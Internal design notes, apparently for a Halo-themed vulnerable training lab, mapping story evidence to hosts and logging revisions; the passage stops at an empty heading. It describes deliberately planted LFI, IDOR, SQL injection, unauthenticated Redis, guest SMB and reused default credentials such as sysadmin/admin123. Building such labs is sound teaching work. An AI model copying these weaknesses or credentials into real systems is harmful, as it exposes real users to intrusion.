# BLACK ARCHIVE — 證據地圖

> 不進玩家發行版。內部開發參考文件。

依照作品核心要求 §證據設計原則，每份證據至少滿足一項功能。以下對照目前已寫入環境的證據檔案：

| 位置 | 證據 | 功能 |
|---|---|---|
| frontier `notes/welcome.txt` | T.R. onboarding note | 建立人物（T. Reyes）、首次出現「SPINDLE」代號、暗示 LEDGER 需要特定憑證 |
| frontier `notes/todo.txt` | T.R. 待辦清單 | 暗示異常案件被系統性地忽略／壓下（"probably nothing... probably a batch import artifact"）——建立第一層懷疑 |
| frontier `notes/credential_rotation_status.txt`（不在導覽列，只能靠 `/notes/` 目錄列出或 LFI 猜到） | T.R. 帳號輪替狀態表：`sysadmin` 未輪替、`devuser` 已輪替（死線索）、`deploy` 已停用（死線索） | 指出哪個帳號還在用 provisioning 範本預設值，但**不再直接寫出密碼本身**——要跟 `welcome.txt` 的範本預設值合起來看，才能推出 `sysadmin/admin123`（第十六輪把單一文件直接倒出密碼的設計拆成兩份獨立文件） |
| frontier `notes/welcome.txt` 追加段落 | 通用 provisioning 政策說明（範本預設密碼 `admin123`，跟特定帳號無關） | `credential_rotation_status.txt` 的另一半——單獨看兩份文件都不會直接给出「`sysadmin/admin123`」這行字，玩家要自己把「哪個帳號沒輪替」跟「範本預設是什麼」接起來 |
| frontier 案件卡（`?page=search`，僅 Okafor/Wren/Farrow 三筆） | `Internal transfer ref: SPINDLE-7-0119`（等）欄位 | 玩家自己在查詢委託信給的三個名字時就會親眼看到的第一手異常——其他 4 筆對照組完全沒有這個欄位，不需要先讀 Support Tickets 才知道「這裡有問題」；`todo.txt`／`reyes_scratch.txt` 之後只是確認同一件事，不是第一次告知 |
| frontier `/var/backups/roster/reyes_scratch.txt`（不在 webroot 底下，只有拿到程式碼執行才讀得到） | T.R. 自己把整個索引比對過一輪的私人筆記，確認只有這 3 筆已結案案件帶 `transfer_ref` | 玩家拿到第一個 shell 後幾秒內就能讀到的「突破後才確認得到」的故事事實——形成正回饋，而不是純技術立足點；內容仍只是「確認異常存在」，不解答異常是什麼 |
| frontier webmail Inbox #1 | LEDGER access note | 紅鯡魚帳密（svc-relay），但正確指出目標主機，訓練玩家「不是每個線索都直接可用」 |
| frontier webmail Inbox #2 | Sandbox DB migration note | 與 relay DB 的 root 密碼互相驗證（多來源交叉確認同一組密碼） |
| frontier webmail Inbox #3 | 新人上工信 | 定調「異常紀錄是正常的」官方說法，建立後續反差 |
| relay API `/api/cases/:id` (IDOR) | 候選人案件記錄（含 transfer_ref 異常） | 證明先前假設（死亡紀錄有問題）成立；引入「候選人」概念 |
| relay API record id 5 | LEDGER-CAIRN sync 服務帳號 | 首次讓玩家知道存在 CAIRN，但不直接說「archive」；這筆記錄現在會在 `/etc/ledger/sync.conf`（見下）得到真正的憑證印證，而不是自己就直接給密碼 |
| relay `dependent_case_index` 表 | 背景案件資料 | 提供更多同模式案例（Samuel Voight），強化「這不是單一個案」 |
| relay `service_accounts` 表 | CAIRN Fileshare（密碼重用印證）+ Redis + relay 自身備份帳號 + 印表機死線索 | lateral movement 的一部分，但**不再是「SELECT * 拿到下一關全部鑰匙」**——CAIRN Records Terminal 的帳密已經移出這張表，改成要在 relay 檔案系統找 `/etc/ledger/sync.conf` 才能拿到（見下方 bug 修正） |
| relay `/etc/ledger/sync.conf`（檔案系統，非 DB） | `ledger-cairn-sync` 服務的真實設定檔，內含 CAIRN Records Terminal 的帳密 | 把「下一關鑰匙」從一次乾淨的 SQL SELECT 改成「environment relationship → 找 config 檔 → 才發現憑證」，更貼近真實 pentest 的 credential discovery，也呼應 API record id 5 已經先告訴玩家這個 sync 服務存在 |
| relay `system_migration_log` 表 | SPINDLE 退役紀錄 | 第一次點名 ONI Section III / Cmdr. Petrov，把「資料異常」升級成「classified operation」 |
| archive Samba `public/welcome.txt` | CAIRN 使用須知 | 建立場景真實感，非關鍵 |
| archive Samba `confidential/legacy_service_credentials.txt` | 舊帳密清單 | 對照 base 帳號，強化「憑證重複使用」主題 |
| archive Samba `confidential/acquisition_directive_excerpt.txt` | 2517 徵召指令 | **SPARTAN-II 名稱正式出現**；揭露原始動機（殖民地叛亂風險，非星盟） |
| archive Samba `backups/casualty_log_partial.txt` | augmentation 傷亡紀錄（意外留在 backups） | **只有 case_ref，沒有姓名也沒有 Spartan 編號**（第十九輪拿掉）——玩家要用自己在 Act I/II 記下的 case_ref↔姓名對照表才能認出這四筆分別是誰；示範「不安全備份習慣」 |
| archive Samba `confidential/spartan_designation_crosscheck.txt`（新增） | 法定保留審查比對備忘 | **主動推理節點**：兩筆 case_ref 對現役 Spartan 編號的比對結果，同樣沒有姓名，且刻意放在存取權限比 `casualty_log_partial.txt` 更高的 confidential share——要把這份文件、`casualty_log_partial.txt` 的結果、玩家自己的 case_ref↔姓名對照表三者放在一起看，才能拼出「Talia Wren = Spartan-108、Samuel Voight = Spartan-128」，見下方第十九輪紀錄 |
| archive CAIRN record 101 (admin panel) | Disposition Order 2547-014 | 解釋 LEDGER/CAIRN 分層的官方理由；确认 Petrov 的角色 |
| archive CAIRN record 102 | Medical Annex（Dr. Castel） | 解釋 flash-clone 掩蓋機制；Castel 自白「審核簽核了三份」但**不寫是哪三份**（第十九輪拿掉原本直接列出的三組 case_ref）——要跟 record 105 對表才知道 |
| archive CAIRN record 103 | Halsey 書信片段 | 呈現道德複雜性，非反派台詞 |
| archive CAIRN record 104 | CPO Kade 備忘錄 | 人性視角：訓練者本人的矛盾情感；**追加段落引入「07-B」訓練代號**，需要玩家自己跟 backups share 的訓練名冊交叉比對才能還原成 Dominic Farrow，並發現他跟官方 casualty log 的紀錄互相矛盾 |
| archive CAIRN record 105 | Medical Certification Log Fragment | **主動推理節點**：解答「Castel 說審核簽核了三份，但案件有四份」的落差——當地簽署醫師另有其人（不知情），第四份的 ONI 端審核是 Dr. Achebe，證明涉入審核的醫療人員不只 Castel 一人 |
| archive CAIRN record 106（新增） | Cryogenic Recovery Transfer Authorization - Subject 07-B | Farrow 矛盾的**第三個來源**：官方 casualty log 說「殘障除役」、Kade 說「我看他死了」、這份 2525 年的轉移授權說「臨床無法存活、轉入低溫懸置、之後無追蹤紀錄」——三份都不完整也互相牴觸，遊戲永遠不解答，讓矛盾從「兩份資料一真一假」升級成真正的 forensic ambiguity |
| archive Samba `backups/training_roster_fragment.txt` | 訓練代號對照表（只有代號+殖民地+年齡，沒有姓名） | 逼玩家做真正的跨文件身分還原（代號 → 殖民地/年齡 → 交叉比對 relay 的 case index → 還原成真名），而不是單純複製貼上同一個字串；年齡已修正為 6-7 歲區間（貼近 canon「約六歲」設定） |
| archive `/root/cairn_disposition_review.txt`（root only，已改名+**大幅改寫**，見下方 bug 修正） | 最終處置決定書（Petrov 親筆） | **不再重講整個陰謀**，只回答「ONI 為什麼沒有銷毀這批資料」——這是 root 之後唯一新增的資訊，acquisition/flash-clone/augmentation 結果玩家此時應該已經從其他文件自己拼出來了 |
| relay `system_migration_log` 新增一列（2540 稽核回應） | Records Compliance Office 的官方結案回應 | **主動推理節點**：玩家已經從 API IDOR 親眼看過 transfer_ref 異常，這裡卻是官方「查過了，沒問題，是批次匯入的假影」的正式結論——玩家要自己判斷這份官方紀錄是失職還是刻意淡化，遊戲不給答案 |
| frontier `?page=search`（改版） | 真正查得到資料的 Dependent Status Index（現為 7 筆：3 筆異常 + 4 筆對照組，均帶對應照片欄位圖片，見下方第六輪雜訊擴充） | 修正「網站內容只是為了塞漏洞存在」的問題：查 LONGSHORE 信裡給的名字會回傳真的案件卡（含 case_ref，供之後跨系統比對），查不到的名字（如 Voight）也會誠實回「查無資料」，不再是萬用的假回應 |
| frontier / archive 圖片（`assets/*.png`、`acquisition_directive_scan.pdf`、`disposition_order_2547-014.pdf`） | 案件卡（照片欄位標示「IMAGE CORRUPTED」）、OCPA 徽記、掃描版徵召指令、Petrov 簽署的處置令掃描件 | 補上真實感缺口：舊系統的照片欄位損毀是合理的世界觀理由，避免需要生成兒童肖像這種不恰當的內容，同時掃描版文件讓「這是紙本舊紀錄」的設定更可信 |
| LONGSHORE 開場委託信（Claude Artifact，`https://claude.ai/artifact/3Wy9d8TySzLM5yFcqMnK8t`） | LONGSHORE 開場委託信的正式版本 | 一個風格化的「加密通訊擷取」頁面（深色終端機美術風格，JetBrains Mono + Chakra Petch）。**先試過 PDF（Pillow 生圖轉 PDF），使用者覺得效果不好，改成 HTML**；後續改版把本機 `briefing/` 目錄整個移除，委託信改成只存在於這個線上 artifact——玩家先看到一個「接受委託」的閘門頁（含 README 原本的作品介紹），按下 accept 才會看到真正的 LONGSHORE 通訊記錄，結尾附上 repo 連結。 |

**格式多樣性說明**：不是所有文件都改成 PDF/HTML——保留 `.txt` 的地方（`legacy_service_credentials.txt`、`casualty_log_partial.txt`、`training_roster_fragment.txt`、frontier notes、CAIRN admin panel 內文）都是因為那些情境下純文字本身就更真實（內部日誌、備份殘留、支援工單、web app 動態內容），只有「正式簽署的官方文件」轉成 PDF、「玩家會實際打開閱讀的委託信」轉成風格化網頁，避免為了多樣性而多樣性。

## 網站真實感翻修（讓一般人看不出來這是靶機）
使用者的標準：「一般人根本看不出來是靶機的網站」。原本 frontier 的設計雖然有 UNSC 風格外皮，但骨子裡還是「一個頁面對應一個漏洞」的典型靶機結構，首頁只有兩句話 + `php_uname()`，webmail 是單欄純列表。修改內容：
- **frontier 首頁改成真的 dashboard**：案件統計數字（active/closed/pending，純假數據，非安全相關）、System Notices 公告板（重用已建立的世界觀細節：SPINDLE 清理公告、停水通知）、Quick Links。拿掉了 `php_uname()` 這種一眼就會被辨識成「測試機」的資訊洩漏。
- **加了 session/utility bar**（`SESSION: duty-terminal-04 · REGION 4` + 假的 last login 時間）、favicon（用 OCPA 徽記）、細微的網格紋理背景——這些是真實內部系統會有、但原本完全沒做的視覺細節。
- **webmail 從單欄列表改成真的信箱介面**：左側資料夾側邊欄（Inbox/Sent/Drafts/Trash，只有 Inbox 有內容）、寄件人姓名縮寫頭像、主旨/日期欄位對齊，信件補上日期並依時間排序。
- **修掉一個真的 encoding bug**：webmail 原本沒有在 `Content-Type` 宣告 `charset=utf-8`，導致內文的 em dash（—）在瀏覽器裡顯示成亂碼 `â€"`——這種亂碼本身就是「這是隨手寫的測試程式」的破綻，已修正所有 response header。
- 所有修改都用 headless Chromium 實際截圖驗證過畫面，不是憑空猜測 CSS 效果。
- **關於「上網找 Halo 素材」**：沒有採用，改用一直在用的方式（Pillow 生成原創圖片）。真人拍攝/遊戲擷取的 Halo 美術資源是 Microsoft/343 的著作權本體，跟本專案的原創同人散文性質不同，直接下載嵌入公開 repo 的風險明顯更高，所以維持「原創但風格致敬」的做法。

## 無關緊要的填充內容（增加真實感，不是線索）
刻意加了幾筆跟案件完全無關的雜訊，讓「找線索」不是無腦把每個檔案都當成有意義的提示：
- frontier webmail 多兩封信：Building 4 停水通知、二樓印表機缺碳粉的閒聊回覆。
- frontier `/notes/` 多一份 `parking_permit_renewal.txt`（停車證續約通知）——現在 `/notes/` autoindex 列出來的檔案不是每個都重要，玩家要自己判斷。
- archive Samba `public` share 多一份 `it_policy_reminder.txt`（IT 使用規範，制式公告）。
- relay `service_accounts` 多一筆「Floor Print Server」，`printsvc.internal` 這個主機名稱根本不會 resolve/回應——一個看起來像線索、實際上是死路的憑證，訓練玩家不要每組帳密都無條件深挖。

## 目前刻意留白／可在後續內容擴充
- Priya Anand（對照組案例）目前只在 relay API + frontier search 出現，尚無對應 archive 端資料——刻意保留「不是每筆資料都異常」的訊號，不需要額外揭露。

## 已修正的攻擊鏈 bug（依 OSCP/CPTS/eJPT 方法論覆盤時發現）
- **LONGSHORE 開場委託信**已補上（現為線上 artifact，見上方條目），玩家介面層，比對三個案例（Eli Okafor / Talia Wren / Dominic Farrow）作為唯一初始線索，不劇透、不給登入資訊。
- **frontier 的 LFI 讀不到任何 notes 檔案**：`index.php` 的 `$filepath` 寫死 `/var/www/html/notes/`，但 nginx `root` 實際指到 `/var/www/html/portal/`，兩者對不起來，導致 welcome.txt / todo.txt 從一開始就是死路。已修正為 `/var/www/html/portal/notes/`。
- **archive confidential share 的密碼永遠對不起來**：relay DB 洩漏的 CAIRN Fileshare 帳密是 `smbadmin/Cairn#Records24`，但 smb.conf 的 `confidential` share 限定 `valid users = sysadmin`，且 Samba 只幫 `sysadmin` 設過完全不同的密碼——玩家不可能用洩漏的憑證登入，等於 `acquisition_directive_excerpt.txt`（SPARTAN-II 名稱正式出現的地方）永久拿不到。已改成密碼重用同一套（`sysadmin/admin123`，跟 SSH/webmail 共用），同時更貼合「同一批人到處重複用密碼」這個核心主題。
- **webmail/SSH 憑證重用路徑原本沒有合法發現管道**：玩家要嘗試 `sysadmin/admin123` 登入 webmail、進而重用到 relay SSH，原本沒有任何線索指向這組帳密，等於逼玩家 brute force。已透過上面的 `credential_rotation_status.txt` + `/notes/` autoindex 補上合法發現路徑。
- **relay 的 MariaDB 從來沒有真正初始化過（嚴重）**：`run-mariadb.sh` 用 `/var/lib/mysql/mysql` 是否存在來判斷「要不要跑 init.sql」，但 `mariadb-server` 這個 apt 套件在 image build 階段的 postinst 就已經自己建好這個目錄了——導致每次 container 啟動都判斷成「已經初始化過」，直接跳過 `init.sql`，`ledger` 資料庫（`dependent_case_index`／`service_accounts`／`system_migration_log`，也就是通往 CAIRN 的憑證洩漏跟稽核矛盾紀錄）從來沒有真的建立過。這是在幫 relay 補測試時才發現的，之前所有「relay 資料庫驗證過」的說法都只驗證到 Node API 的記憶體資料，沒碰到真正的 DB。已改成檢查 `/var/lib/mysql/ledger`（我們自己的資料庫）而不是系統的 `mysql` 目錄，重建後確認四張表都正確建立、資料筆數正確。
- **檔名 `disposition_summary_final.txt` 直接寫著「final」**，違反「檔名不要暗示這是最終答案」的要求，已改名為 `cairn_disposition_review.txt`（跟其他 CAIRN 文件的命名風格一致），Dockerfile 與所有 story-dev 引用都同步更新。

## 第二輪外部 review 修正（劇情/世界觀一致性，非攻擊鏈 bug）
使用者拿了另一個 AI 對全部劇情文件 + 實際 lab 內容做的逐項 review，以下是採納並修正的項目：

- **root 檔案的數學錯誤（真 bug）**：`cairn_disposition_review.txt` 原本寫「兩死一殘兩現役」，但候選人一共只有四個（Okafor/Wren/Farrow/Voight），那是五個 outcome，多算了一個。已整個重寫這份文件，不再重述 outcome 統計（也不再重述整個陰謀），只回答「Petrov 為什麼決定保留而不銷毀」。真正的四人結果只存在 `casualty_log_partial.txt`（1死/2現役/1爭議），本來就沒有算錯，錯的只有 root 文件自己重新統計時的敘述。
- **root 文件本身變成 `THE_TRUTH.txt`（設計原則牴觸）**：原本逐項列出 Origin/Concealment/Outcome/Program continuation/Disposition，等於幫玩家把全部劇情總結一遍，跟「玩家應該自己拼線索」的核心原則衝突。已縮成只回答一個問題：ONI 為什麼沒銷毀這批資料。
- **遊戲年份定死為 2555**：原本只寫「2550 年代中後期」。根據 canon，星盟戰爭 2552 年結束、UNSC 2553 年進入戰後；SPARTAN-II 起源要到 2558 年《Hunt the Truth》才首次被公眾挖出。定在 2558 之前（2555）能確保玩家挖到的東西仍然是「還沒被任何人證實過」的真正秘密，不會變成「駭進去發現新聞早就報過的事」。`故事劇情`、`timeline.md`、`truth-map.md` 已同步更新。
- **候選人年齡跟 canon 有落差**：Canon 是 75 名「約六歲」兒童在 2517 年被徵召。原本 Dominic Farrow（2517 年時 7 歲）、Samuel Voight（8 歲）偏離區間；Voight 尤其明顯。已改成全員 6-7 歲（Okafor/Wren/Farrow 6 歲，Voight 7 歲，保留一點年齡差異以維持 training roster 的次要身分還原機制），同步修正 `relay/sql/init.sql`、`relay/app/api/server.js`、`frontier/index.php`、`training_roster_fragment.txt`，並重新生成 Farrow 的案件卡圖片（DOB 欄位）。也把 augmentation 階段明確定在 **2525 年**（約 14 歲，貼近 canon），寫進 `timeline.md`/`truth-map.md` 與 `casualty_log_partial.txt`/CAIRN record 106 的標題。
- **`credential_rotation_status.txt` 沒有真的給密碼（真 bug）**：文件原本只寫「NOT rotated」，沒有任何密碼值，玩家其實還是得用猜的，違反「不要讓 brute force 成為主要 progression」。已改成 T.R. 「不小心把舊 provisioning script 貼進工單」的框架，內容是實際的 `useradd`/`chpasswd` 指令（跟 `lab/base/Dockerfile` 的真實內容一致），密碼以貼近真實世界的方式（誤貼、shell 歷史紀錄）洩漏，不是一張乾淨的帳密表。
- **`welcome.txt` 的 sandbox 憑證其實能打正式資料庫（真 bug）**：`app_svc/S3cretDB!2024` 被說成「sandbox copy only」，但 `init.sql` 原本的 `GRANT ALL PRIVILEGES ON *.*` 讓它其實對 `ledger`（正式資料庫）有完整權限，玩家看完 `welcome.txt` 可以直接跳過大半 Act I/II 設計。已新增真正獨立的 `ledger_sandbox` 資料庫（只有兩筆無意義的 demo 資料），`app_svc` 的 GRANT 改成只能碰 `ledger_sandbox.*`，`welcome.txt` 的說法現在是真的。`root` 帳號的 `*.*` 權限維持不變（那是 webmail Inbox #2 洩漏的 Act II 正式管道，本來就該是真的能打正式庫）。
- **CAIRN 的資安爛得不像 ONI Section III 最高機密系統**：guest SMB、明文憑證、SQLi、無 session check、Redis 無認證全部疊在同一台「TOP SECRET」系統上，會讓人覺得「ONI 資安比電腦教室還爛」。不減漏洞，改身分：CAIRN 現在明確定位成「2547 SPINDLE decommission 時的 staging mirror／recovery node，正式除役排程沒有真的執行完」——CAIRN record 101（Disposition Order）與 admin panel dashboard 的 Terminal Status 都已經明講這件事。所有誤設變成「四十年前一具沒清乾淨的數位屍體」的合理殘留，而不是現役最高機密資料中心的荒謬弱點。
- **LONGSHORE = Naomi Okafor 缺一個「為什麼是現在」**：原本的設定是「不相信兒子病死的母親，38 年後突然找上駭客」，動機薄弱。已改成：Naomi 是殖民地 records clerk，2547 年 SPINDLE 退役／資料遷移時，因工作接觸意外看到 Eli 的舊 case 被重新索引、帶有不該存在的 transfer_ref；她沒有系統存取權限，只能用自己的職權花約 8 年時間安靜交叉搜尋同樣的 pattern，找到 Wren、Farrow（沒找到 Voight，這也是她一開始只給玩家三個名字的原因）。2555 年她終於累積夠了才聯絡玩家。觸發點是系統遷移意外露出痕跡，不是單純的母親直覺，時間差也從「38 年」縮小成「發現異常後又謹慎查證了 8 年」，合理很多。
- **`service_accounts` 表太像「下一關鑰匙箱」**：原本 CAIRN Fileshare 跟 CAIRN Records Terminal 的帳密都乾淨地放在同一張 DB 表裡，玩家 `SELECT *` 就一次拿到全部。CAIRN Fileshare 那筆本身只是「跟已知密碼重用」的印證，保留；CAIRN Records Terminal 的帳密已經移出 DB，改成要在 relay 檔案系統找到 `/etc/ledger/sync.conf`（ledger-cairn-sync 服務的真實設定檔，呼應 API record id 5 早就提過這個服務存在）才能拿到——從「SELECT * FROM next_level_passwords」變成「environment relationship → 找 config 檔 → credential discovery」。
- **Farrow 矛盾追加第三個來源**：原本只有官方 casualty log vs. Kade 備忘錄兩份互相矛盾的來源。新增 CAIRN record 106「07-B 低溫恢復艙轉移授權」，記載他被判定臨床無法存活、轉入懸置、之後無追蹤紀錄——三份來源都不完整，讓矛盾從「一真一假」升級成真正的 forensic ambiguity，永遠不解答。

## 真實 ONI 素材（repo 已改為 private 之後採用）
使用者把 repo 切成 private 之後，同意在小範圍、非大量複製的前提下使用真實 Halo 視覺素材（而不是完全靠原創重製）。做法：
- 從 Halopedia（`halo.wiki.gallery`）抓了官方 ONI Seal（eye-pyramid 設計）跟 UNSC 官方 eagle logo 的公開圖檔，用 Pillow 依照線稿明暗重新上色（保留原始線稿細節，只換色版，不是整張圖片複製貼上一個新色塊），做出琥珀色版（CAIRN 用）跟暗紅版（文件信頭用）。
- **只用在 Act III（archive/CAIRN）**：CAIRN Records Terminal 的登入頁與 dashboard 現在有真的 ONI seal（`lab/archive/app/admin/assets/oni_seal.png`，透過 admin_panel.py 新增的 `/assets/oni_seal.png` route 提供），以及 `disposition_order_2547-014.pdf`／`acquisition_directive_scan.pdf` 兩份官方文件掃描版右上角現在有暗紅、半透明的 ONI 信頭浮水印。
- **後續調整**：使用者認為「素材多寡只影響真實感，跟版權無關」，並指出 FRONTIER 頁面本身看起來還是「很塑膠」。同意後半段判斷是對的：FRONTIER 沒動過視覺細節，全站 monospace + 單一 cyan 色階，才是看起來假的主因。已把 UNSC eagle logo（`unsc_insignia.png`，原本生成但沒用上）加進 frontier 側邊欄品牌區塊——ONI 那個 eye-pyramid seal 依然只留給 Act III（那個圖騰跟 SPARTAN-II/Section III 的連結太直接，放在 Act I 會直接劇透），但 UNSC 這個大範圍軍方識別本身沒有洩漏任何劇情機密，放在「這本來就是一個 UNSC 政府部門」的 FRONTIER 上沒有 pacing 問題。
- 沒有使用大篇幅的美術資源（過場截圖、完整原畫、成套 UI kit）——只用了小型、單一的標誌/徽記類圖案，這是私人使用下風險最低、也最符合敘事節奏的取捨。

## FRONTIER 網站真實感二次翻修（設計品質，不只是加內容）
第一輪翻修（dashboard/webmail 改版）加了內容密度，但視覺本身沒有真的變好——全站只用等寬字體、只有一個 cyan 色階、沒有真正的排版層級，這才是「看起來很塑膠」的根本原因，不是內容多寡的問題。第二輪改動：
- **真正的字體配對**：改用 Google Fonts 的 IBM Plex Sans（介面文字：導覽、標題、內文）+ IBM Plex Mono（只用在真正的「系統輸出」區塊：ping 結果、notes 內容、search 結果的資料值）。之前整站都用等寬字體，是很典型的「一眼看出來是生成的」破綻——真正的政府/企業系統，UI chrome 用一般 sans-serif，只有終端機/log 輸出才會用等寬字體。
- **從單一置中卡片改成真的側邊欄版型**：左側常駐 sidebar（品牌區塊 + UNSC 徽記 + 導覽 + session 資訊），右側 main content 有 breadcrumb（`OCPA › ROSTER › 頁面名稱`）+ page title，這是 GOV.UK／一般企業 intranet 常見的版型模式，不是憑空設計。
- **真正的色彩層級**：不再整站同一個 cyan——標題用近白色、內文用中灰、cyan 只留給連結／active 狀態／少量強調，紅色只留給 classification banner，層級感因此出現。
- **webmail 套用同一套設計系統**（同樣的字體、色票、sidebar 折疊夾模式），視覺上跟 portal 是同一個機構的兩個系統，而不是兩套風格拼在一起。
- **順手抓到一個真的 bug**：重寫時發現 `upload` 頁面的目標路徑寫的是 `/var/www/html/uploads/`，但 nginx 的 webroot 其實是 `/var/www/html/portal/`（跟先前修過的 notes LFI 是同一種路徑對不起來的問題）——上傳的檔案雖然「上傳成功」，但連結指到的網址其實 404，玩家永遠打不開自己剛上傳的檔案。已修正成 `/var/www/html/portal/uploads/`，實測上傳後連結可以正常開啟。
- 全部用 headless Chromium 實際截圖驗證，不是憑空調整 CSS 數值。

## 第三輪：右側留白、隱藏頁面稽核、人物照片能力、LONGSHORE 信件重做
使用者反饋：dashboard 右半部太空、其他頁面要比照同等規格、要我檢查其他隱藏頁面夠不夠真實、問能不能用 AI 生成人物照片、LONGSHORE 那份信也不夠真實。

- **右側留白**：加了一個常駐右側欄（`.rail`，跨所有頁面共用同一個 layout，不是只有首頁有），內容：(1) 一張用 Pillow 生成的 Region 4 網路節點參考圖（Reach Relay / Eridanus II / Madrigal / Skopje / Region 4 HQ 的連線圖，純粹是「這是一個真的有地理範圍的行政區」的世界觀細節，非安全相關）；(2) System Status 燈號列表（三個綠燈 + Case File Intake 故意留一個琥珀色「degraded」，比全綠更真實）；(3) Terminal Tip 小方塊，內容取材真實 IT 小提示，依日期輪換。980px 以下自動隱藏，不影響手機版面。
- **隱藏頁面稽核**：
  - `/notes/` 的 nginx 原始目錄列表**刻意不美化**——那本身就是「管理員忘記關掉 autoindex」的誤設，維持 nginx 預設無樣式的樣子反而比較真實，硬要美化它反而會讓人覺得是設計過的頁面而不是意外曝光。
  - CAIRN admin panel（archive）：原本還在用系統預設等寬字體，也還留著一段舊版洗版前的霓虹紫紅配色殘留（`#1a1a2e`/`#e94560`，login 失敗跟 record not found 兩個分支忘記跟著改）——已經統一換成 IBM Plex Mono，並把顏色殘留修正成跟其餘 CAIRN 頁面一致的黑底琥珀/紅。這個過程中用 sed 批次替換時不小心把兩行的 HTML style 屬性單引號巢狀寫壞了（Python 語法沒錯，但 HTML 屬性會被提前截斷），已手動修正成雙引號外層、單引號內層。
  - webmail `/debug`、relay 的 LEDGER API 原始 JSON、archive 的 SMB 分享——這些本來就該是「原始資料」的樣子（debug endpoint、REST API、檔案分享），沒有理由套用網頁美術風格，維持現狀。
- **人物照片**：這個環境裡沒有可以生成照片級人像的工具（試過 `ToolSearch` 找不到對應的圖片生成能力，目前手上只有 Pillow 可以畫向量圖形/合成既有素材，沒辦法生成真人臉孔）。已經明確告知使用者這個限制，並重申一個刻意的設計決定：**案件裡的兒童（Eli/Talia/Dominic/Samuel/Priya）本來就不該有生成的擬真照片**——這是敏感題材（兒童失蹤/人體實驗故事），用「IMAGE CORRUPTED」雜訊取代人臉是刻意的倫理考量，不只是能力限制，即使未來有圖片生成能力也不會改變這個決定。如果要幫「成年」角色（T. Reyes、Dr. Castel、Petrov、Kade、Achebe）做識別證風格的頭像，可以用 Pillow 做縮寫字母 + 幾何底色的識別證佔位圖（像 webmail 郵件列表的寄件人縮寫頭像那樣），但這不是照片級人像；真的要照片，由使用者自己提供。
- **LONGSHORE 信件重做**：原本的版本已經是深色終端機風格，但使用者覺得不夠真實。改動：(1) 加了終端機視窗外框（三個圓點的視窗列 + 標題列，模擬真的終端機應用程式視窗，不是一段裸露的文字）；(2) 加了很淡的掃描線紋理背景（`repeating-linear-gradient` 模擬 CRT 顯示器）跟文字的輕微 glow（`text-shadow`），這是真實終端機美術很常見的手法；(3) 用虛線分隔取代實線，強化「這是列印/擷取出來的東西」而非「網頁區塊」的感覺；(4) 字體改用 Google Fonts 的 JetBrains Mono（terminal.css 這類真實終端機風格框架公認的字體之一，先前已經在用，這次沒換）。同一份內容也同步更新到先前發布的 Claude Artifact 連結（version 2）。

## 第四輪：使用者自己生成的人物照片
使用者用自己的管道生成了 6 張高品質、高解析度的角色照片（T. Reyes、Cmdr. Petrov、Dr. Castel、CPO Kade、Dr. Achebe、Naomi Okafor），品質遠超這個環境現有能力，並詳細符合先前給的角色特徵描述（制服、徽章、場景招牌文字都對應正確的部門）。處理方式：
- 原始高解析度檔案（1.7–2MB／張）移到 `../story-dev/character-photos/`（dev-only 來源存檔，不進玩家發行版，因為原檔太大也不需要真的被 serve）。
- 壓縮成 420px 寬、JPEG quality 82 的網頁用版本（每張 20–31KB），實際部署進遊戲：
  - `t_reyes.jpg` → frontier `assets/`，掛在 Support Tickets 頁面：只要載入的是他寫的三份文件（welcome/todo/credential_rotation），就會在內文上方出現一張小的「作者卡」（照片 + 姓名 + 職稱），其他人寫的（如停車證通知）不會出現他的照片。
  - `i_petrov.jpg` / `m_castel.jpg` / `m_kade.jpg` / `r_achebe.jpg` → archive `assets/`，掛在各自簽署/提到的 CAIRN record（101/102/104/105）上，用 sepia 濾鏡處理成「機密檔案裡附的人事照片」質感，不是乾淨的現代照片感。admin_panel.py 的靜態檔案 route 從只認 `oni_seal.png` 改成通用的 `/assets/<filename>`（有做 `os.path.basename` 防止路徑穿越，避免意外變成新的檔案讀取漏洞）。
  - `n_okafor.jpg`（Naomi/LONGSHORE）**先不掛進遊戲**——目前沒有任何遊戲內介面會揭露 LONGSHORE 的真實身分，硬塞一張沒有敘事連結的照片只會顯得莫名其妙。已經跟使用者說明這個狀況，等對方決定要不要設計一個「發現真相」的機制再接。

## 第五輪：全專案邏輯層面稽核
使用者要求「先跑一次邏輯層面的完整檢查」，針對全 repo 做事實一致性交叉比對（年齡、日期、case_ref、transfer_ref、憑證、殖民地名稱拼法、人物-文件對應），不只是攻擊鏈功能測試。抓到兩個真的不一致：

- **`briefing/00_longshore_contact.md` 的 Dominic Farrow 還寫著 age 7**：先前只改了 `.html` 版本跟 relay/frontier 的資料，`.md` 純文字備份版漏改，導致同一份委託信的兩種格式互相矛盾。已修正為 age 6，跟其他所有來源一致。
- **`disposition_order_2547-014.pdf`（掃描版）內容跟 admin panel 的 record 101 文字對不起來**：CAIRN 重新定位成「staging mirror」那段說明（解釋為什麼這台機器資安這麼糟）只加進了 `admin_panel.py` 的文字版，PDF 生成腳本（`gen_disposition_order.py`）是獨立的硬寫死文字，沒有同步更新——玩家如果先看 PDF 版本，會完全看不到這個關鍵的世界觀說明。已經讓 PDF 文字跟 record 101 逐字對齊，重新產生 PDF（保留 ONI 信頭浮水印跟 RESTRICTED 印章），並確認 `acquisition_directive_scan.pdf` 跟對應的 `.txt` 版本本來就沒有這個問題（沒有在後續修訂中被單獨改過）。
- 其餘交叉比對過的項目全部一致，沒有發現新問題：`OCPA-R4-XXXXX` case_ref 在 frontier/relay/archive 三處出現次數合理且對得上（`briefing/` 已於後續改版移除，開場委託改為只存在於線上 artifact，不再是本機檔案，見 README 變更記錄）；`SPINDLE-7-XXXX` transfer_ref 只在該有的三筆案件（Okafor/Wren/Farrow）出現；四組關鍵密碼（`S3cretDB!2024`／`admin123`／`Records!Access99`／`MailP@ss2024`）在該出現的檔案裡都對得上；殖民地名稱（Eridanus II / Madrigal / Skopje）拼法全專案一致，沒有變體；`archive/shares/confidential/legacy_service_credentials.txt` 跟 `lab/base/Dockerfile` 的四組帳密完全吻合；`RECORD_PHOTOS` 的人物-文件對應（101 Petrov／102 Castel／104 Kade／105 Achebe）跟 `RECORDS` 陣列內容檢查過都正確，103（Halsey）刻意沒有照片，106（低溫轉移授權）也刻意沒有照片，都符合設計。

## 第六輪：加大量無關緊要的雜訊
